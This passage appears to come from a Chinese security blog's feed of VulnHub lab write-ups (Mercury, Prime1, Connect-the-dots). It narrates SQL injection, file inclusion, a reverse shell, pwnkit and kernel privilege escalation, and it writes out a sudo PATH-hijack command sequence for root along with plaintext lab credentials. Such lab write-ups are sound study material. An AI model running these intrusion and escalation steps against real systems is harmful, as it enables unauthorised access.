src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240315162153.png"></p><blockquote><p>注意：该工具仅支持py&gt;&#x3D;3.9</p></blockquote><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><ol><li>端口扫描：web、ftp、ssh</li><li>ftp：兔子洞</li><li>web渗透：扫到了很多东西，经过梳理，有用的页面有monitor、squirrelmail、bluditCMS登录页。news目录暴露出了项目主管人名字Otis，走投无路下只得使用Otis爆破，成功以Otis@123456登录进入monitor和mail。经过研究功能发现，monitor通过ping探测主机是否开启，关闭时会向mail发送邮件以展示详细信息，后发现Host参数位存在双引号注入，使用联合查询在mysql.user找到可爆破出密码的用户凭据elliot@elliot123，成功拿到立足点。</li><li>pwnkit非预期提权：内核较老，polkit-helper具有s位，使用pwnkit完成提权</li><li>火狐缓存破解：用户家目录存在火狐的隐藏文件，经过探查发现可能转储了用户密码信息，使用firefox_decrpt工具成功破解出root用户的密码</li></ol>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub Mercury</title>
    <link href="/blog/vulnhub/vulnhub%20Mercury/"/>
    <url>/blog/vulnhub/vulnhub%20Mercury/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240301164809.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240301165013.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240301165415.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240301165631.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240301165935.png"></p><blockquote><p>扫描结果：8080、22<br>其余信息什么也没有，开始web渗透：</p></blockquote><h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240301170757.png"></p><blockquote><p>可以确定是目录爆破</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240301170712.png"></p><blockquote><p>各目录扫描均无结果，怀疑是特殊目录名，打开浏览器测试：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240301172406.png"></p><blockquote><p>熟悉的django的404页面，而且开启了debug，暴露出了所有目录，由此得知了隐藏目录mercuryfacts</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240301172457.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240301172555.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240301172616.png"></p><blockquote><p>好像没什么信息，下载图片检查，没有信息</p></blockquote><blockquote><p>又注意到facts&#x2F;1处伪静态传参，想到todo里面说直接连接了数据库，测试注入：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240301173814.png"></p><blockquote><p>测出注入，选用报错注入：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240301174003.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240301174654.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240301175040.png"></p><blockquote><p>另注意：若跑sqlmap，注入点在url要在注入点前加星号</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;10.10.10.147:8080/mercuryfacts/*1/&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240301175856.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240301180033.png"></p><blockquote><p>webmaster登录成功</p></blockquote><h2 id="0x03-提权–pwnkit"><a href="#0x03-提权–pwnkit" class="headerlink" title="0x03 提权–pwnkit"></a>0x03 提权–pwnkit</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240306153215.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240306153235.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240306153304.png"></p><blockquote><p>拿到linuxmaster的凭证</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240306153412.png"></p><blockquote><p>枚举时意外的发现polkit有root的s位，尝试提权：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240306154847.png"></p><blockquote><p>常规利用失败，尝试打pwnkit：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240306154934.png"></p><blockquote><p>成功提权</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240306155027.png"></p><h2 id="0x04-预期提权–环境变量劫持-sudo提权"><a href="#0x04-预期提权–环境变量劫持-sudo提权" class="headerlink" title="0x04 预期提权–环境变量劫持+sudo提权"></a>0x04 预期提权–环境变量劫持+sudo提权</h2><blockquote><p>在linuxmaster下sudo枚举：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240306160141.png"></p><blockquote><p>有sudo权限的脚本文件使用了tail命令，很遗憾这个脚本没有写权限，但是可以执行，想到可以用环境变量去劫持掉tail命令，替换成vim命令，此时就可以把命令执行点外带出来</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240306161148.png"></p><blockquote><p>注意：，sudo 命令会使用安全的默认的PATH路径，并不会使用我们刚export的当前目录，故产生了上述报错，需要加一个<code>--preserve-env=PATH</code>参数</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240306161316.png"><br><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240306161349.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240306161422.png"></p><blockquote><p>成功root</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /usr/bin/vim <span class="hljs-built_in">tail</span><br><span class="hljs-built_in">export</span> PATH=$(<span class="hljs-built_in">pwd</span>):<span class="hljs-variable">$PATH</span><br>sudo --preserve-env=PATH /usr/bin/check_syslog.sh<br></code></pre></td></tr></table></figure><h2 id="0x05-非预期–内核提权"><a href="#0x05-非预期–内核提权" class="headerlink" title="0x05 非预期–内核提权"></a>0x05 非预期–内核提权</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240306164031.png"></p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><ol><li>端口扫描：ssh、web</li><li>web渗透：django未关debug导致404报错出隐藏目录，对url的页面参数注入，报错注入拿到登录凭据</li><li>提权：在web用户家目录下发现系统用户的凭据，登录后枚举到polkit的s位，使用pwnkit提权成功；预期提权，劫持有sudo权限的脚本所使用的tail命令为vim的执行文件，外带出root的命令执行点，成功提权</li></ol>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub Prime1</title>
    <link href="/blog/vulnhub/vulnhub%20Prime1/"/>
    <url>/blog/vulnhub/vulnhub%20Prime1/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240307100935.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240307101107.png"></p><blockquote><p>只开放了80、22</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240307101114.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240307101205.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240307101625.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240307101753.png"></p><blockquote><p>wordpress的站</p></blockquote><h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240307101844.png"></p><blockquote><p>下载图片检查隐写，无果<br>起目录爆破：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240307103121.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240307103140.png"></p><blockquote><p>image.php和index.php看似一样</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240307103201.png"></p><blockquote><p>留下了hint，说要对每个php页面做模糊测试寻找参数，目标是看到location.txt<br>提供了一个工具：wfuzz(<a href="https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web">https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web</a>)</p></blockquote><blockquote><p>先接着用dirb扫下wordpress的目录：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240307103445.png"></p><blockquote><p>这里选择先放下wordpress，转向hint的提示：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240307104121.png"></p><blockquote><p>是一个对wfuzz工具的介绍文档</p></blockquote><h3 id="页面未知参数探测"><a href="#页面未知参数探测" class="headerlink" title="页面未知参数探测"></a>页面未知参数探测</h3><blockquote><p>不知道什么原因kali自带的wfuzz一直报错，改用docker的：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -v $(<span class="hljs-built_in">pwd</span>)/../../../usr/share/wfuzz/wordlist/general/common.txt:/wordlist/ -it ghcr.io/xmendez/wfuzz wfuzz -c -w wordlist --hc 404 --hw 12 http://10.10.10.148?FUZZ=something<br></code></pre></td></tr></table></figure><blockquote><p>-v：将本地的字典文件挂载到docker<br>–hc：过滤掉404页面<br>-c：url编码<br>–hw：以响应报文长度过滤，过滤掉错误的尝试(长度12)<br>常用的参数字典：<br>&#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt:&#x2F;wordlist&#x2F;、&#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;burp-parameter-names.txt</p></blockquote><blockquote><p>另：也可使用ffuf进行模糊测试：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ffuf -u http://10.10.10.148?FUZZ=something -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 136<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240307111524.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240308132230.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240307111541.png"></p><blockquote><p>拿到提示：secrettier360<br>想到image.php：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240307111725.png"></p><blockquote><p>好像看起来只是个fun ：(<br>那么secrettier360可能就是wp的用户名或者密码：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240307112101.png"></p><blockquote><p>看来是密码，接着尝试用wp-scan爆破用户名：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240307185434.png"></p><blockquote><p>爆破失败，且对hydra爆破也有限制，放弃<br>接着研究那个奇怪的参数：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240308103752.png"></p><blockquote><p>文件包含+目录穿越<br>按照提示去他的家目录找密码：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240308103829.png"></p><blockquote><p>成功登录wordpress</p></blockquote><h3 id="wordpress-5-2-2"><a href="#wordpress-5-2-2" class="headerlink" title="wordpress 5.2.2"></a>wordpress 5.2.2</h3><blockquote><p>尝试修改主题，改马：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240308104013.png"></p><blockquote><p>没权限保存</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240308110649.png"></p><blockquote><p>查看配置，暴露出了绝对路径，用文件包含查mysql的配置文件：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240308110755.png"><br><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240308110830.png"></p><blockquote><p>由于mysql也未暴露于公网，暂时没什么用<br>返回改主题的思路：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240308115457.png"></p><blockquote><p>重新认真浏览后发现了可修改的secret.php</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240308115804.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240308115822.png"></p><blockquote><p>拿到反弹shell</p></blockquote><h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240308120509.png"></p><blockquote><p>sudo枚举发现一个奇怪的执行文件，不过好像没什么用<br>跑linpeas：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240308120635.png"></p><blockquote><p>提供了wget和gcc，内核提权的概率大大增加：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240308120912.png"><br><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240308120958.png"><br><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240308121013.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240308121242.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240308121534.png"><br><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240308121556.png"></p><blockquote><p>优先尝试pwnkit：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240308121913.png"></p><blockquote><p>直接命中，完成提权</p></blockquote><h2 id="0x04-提权另解"><a href="#0x04-提权另解" class="headerlink" title="0x04 提权另解"></a>0x04 提权另解</h2><h3 id="其余内核提权"><a href="#其余内核提权" class="headerlink" title="其余内核提权"></a>其余内核提权</h3><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240308131440.png"></p><blockquote><p>经尝试，经典的45010也可以完成提权</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240308121013.png"></p><blockquote><p>除此以外，linpeas推荐的cve-2017-16695也可以成功提权</p></blockquote><h3 id="横向提权"><a href="#横向提权" class="headerlink" title="横向提权"></a>横向提权</h3><h4 id="openssl破解"><a href="#openssl破解" class="headerlink" title="openssl破解"></a>openssl破解</h4><blockquote><p>在opt找到了隐藏文件，泄露出了执行enc的密码</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240310132420.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240310132909.png"></p><blockquote><p>执行后生成了enc.txt和key.txt</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240310133123.png"></p><blockquote><p>一个密钥，一个密文<br>按他说的生成密钥：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240310133203.png"></p><blockquote><p>注意：echo会自动加换行符，要加n参数</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240310133254.png"></p><blockquote><p>经md5、hex编码后得到了密钥，十六进制64个字符，对应了256位的密钥，推测为aes256</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240310131734.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl enc -a -d -<span class="hljs-keyword">in</span> enc.txt -K <span class="hljs-string">&#x27;33363661373463623363393539646531376436316462333035393163333964310a&#x27;</span> -aes-256-ecb 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240310135944.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240310140007.png"></p><blockquote><p>拿到了saket的密码：tribute_to_ippsec</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240310140352.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240310140528.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240310140632.png"></p><blockquote><p>看报错信息，其可能执行了&#x2F;tmp&#x2F;challenge，且这个文件不存在<br>直接劫持掉：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240310140835.png"></p><blockquote><p>成功提权</p></blockquote><h5 id="编码种类爆破"><a href="#编码种类爆破" class="headerlink" title="编码种类爆破"></a>编码种类爆破</h5><blockquote><p>不认识是aes256怎么办？直接写脚本全部尝试！</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240317163409.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240317163527.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240317163614.png"></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub Connect-the-dots</title>
    <link href="/blog/vulnhub/vulnhub%20Connect-the-dots/"/>
    <url>/blog/vulnhub/vulnhub%20Connect-the-dots/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227102516.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227102812.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227102900.png"></p><blockquote><p>有效服务：ftp、nfs、web、ssh（7822），还有一堆rpc的子服务</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227103546.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227103720.png"></p><blockquote><p>漏洞扫描显示有sql注入、目录泄露</p></blockquote><h2 id="0x02-ftp"><a href="#0x02-ftp" class="headerlink" title="0x02 ftp"></a>0x02 ftp</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227103813.png"></p><blockquote><p>匿名登录失败，大概率需要发现凭证后再利用，或者公开漏洞，先记下版本号<code>vsftpd 2.0.8</code></p></blockquote><h2 id="0x03-nfs挂载"><a href="#0x03-nfs挂载" class="headerlink" title="0x03 nfs挂载"></a>0x03 nfs挂载</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227104036.png"></p><blockquote><p>可挂载路径在morris的家目录下，大概率可以利用</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227111456.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> mount<br><span class="hljs-built_in">cd</span> mount<br>mount -t nfs 10.10.10.143:home/morris /home/kali/vulnhub/mount -nolock<br><span class="hljs-built_in">df</span> -h<br><span class="hljs-built_in">ls</span> -liah<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227111605.png"></p><blockquote><p>没有有用信息，转向web渗透</p></blockquote><h2 id="0x04-web渗透"><a href="#0x04-web渗透" class="headerlink" title="0x04 web渗透"></a>0x04 web渗透</h2><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227112243.png"></p><blockquote><p>提示枚举，多跑几个目录爆破</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227112347.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227113402.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227113841.png"></p><blockquote><p>大概率是兔子洞，先不检查视频了</p></blockquote><blockquote><p>扫到了之前扫出注入的页面</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227113745.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227113820.png"></p><blockquote><p>好像是一个网站后台的登录页面，好像就是个静态页面<br>注意到bootsrap.min.cs文件</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227132218.png"></p><blockquote><p>是jsfuck，合并几个变量后解码：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227133212.png"></p><blockquote><p>拿到凭据，TryToGuessThisNorris@2k19，ssh登录到7822端口</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227133613.png"></p><blockquote><p>看来拿到的是密码，用户应该就是之前nfs发现的用户morris</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227133827.png"></p><blockquote><p>注意到居然是密码中是norris，结合主页信息，他们一个叫N一个叫M，对上了，看来用户名应该是norris</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227134004.png"></p><blockquote><p>拿到了立足点</p></blockquote><h2 id="0x05-提权"><a href="#0x05-提权" class="headerlink" title="0x05 提权"></a>0x05 提权</h2><h3 id="横向"><a href="#横向" class="headerlink" title="横向"></a>横向</h3><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227134553.png"></p><blockquote><p>在norris的家目录找到了四个备份文件，scp到本地</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">scp -r -P 7822 norris@10.10.10.143:/home/norris/ftp/files .<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227143105.png"></p><blockquote><p>查看：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227143523.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227143624.png"></p><blockquote><p>摩斯</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227143851.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227144022.png"></p><blockquote><p>说是要寻找一个公开的秘密文件，后续脚本枚举时注意</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227144707.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227144759.png"></p><blockquote><p>和之前看到的一样，没什么用，看一下web路径就可以跑lin了</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227144939.png"></p><blockquote><p>直接找到了secretfile</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227145048.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227145221.png"></p><blockquote><p>目录爆破字典还是不够强大</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227145511.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227145824.png"></p><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227145949.png"></p><blockquote><p>swp文件为临时交换文件，应该是他在写secretfile的时候没写完，刚写到密码如下时异常退出了，这也对上了为什么morris一直在说快没电了</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/FYHypo/FYHypo.github.io@main/img/pic/Pasted%20image%2020240227150140.png"></p><blockquote><p><code>blehguessme090</code>，这应该就是morris的密码</p></blockquote><p><img 